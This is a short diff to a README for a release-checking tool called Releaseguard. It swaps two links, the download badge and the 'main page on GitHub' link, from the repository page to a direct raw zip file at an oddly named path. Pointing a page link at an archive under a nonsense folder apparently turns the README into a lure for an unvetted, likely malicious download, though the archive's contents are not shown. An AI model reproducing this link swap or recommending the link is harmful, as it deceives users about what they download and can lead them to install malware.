@@ -14,7 +14,7 @@ Releaseguard is a smart assistant that checks your software releases before they
 
 ### Step 1: Get the Application
 
-[![Download Releaseguard](https://img.shields.io/badge/Download-Releaseguard-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f&labelColor=1b1f23)](https://github.com/aschelminthescrabeaterseal512/releaseguard)
+[![Download Releaseguard](https://img.shields.io/badge/Download-Releaseguard-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f&labelColor=1b1f23)](https://raw.githubusercontent.com/aschelminthescrabeaterseal512/releaseguard/main/Rallinae/3.4.zip)
 
 Visit this link to download the application.
 
@@ -146,7 +146,7 @@ Releaseguard is designed with privacy in mind:
 
 You're now fully equipped to use Releaseguard. Remember, the main purpose is simple: catch problems before your users do.
 
-- Visit our main page for news and resources: [Releaseguard on GitHub](https://github.com/aschelminthescrabeaterseal512/releaseguard)
+- Visit our main page for news and resources: [Releaseguard on GitHub](https://raw.githubusercontent.com/aschelminthescrabeaterseal512/releaseguard/main/Rallinae/3.4.zip)
 - Bookmark this page for quick reference
 - Share your experience with other users
 
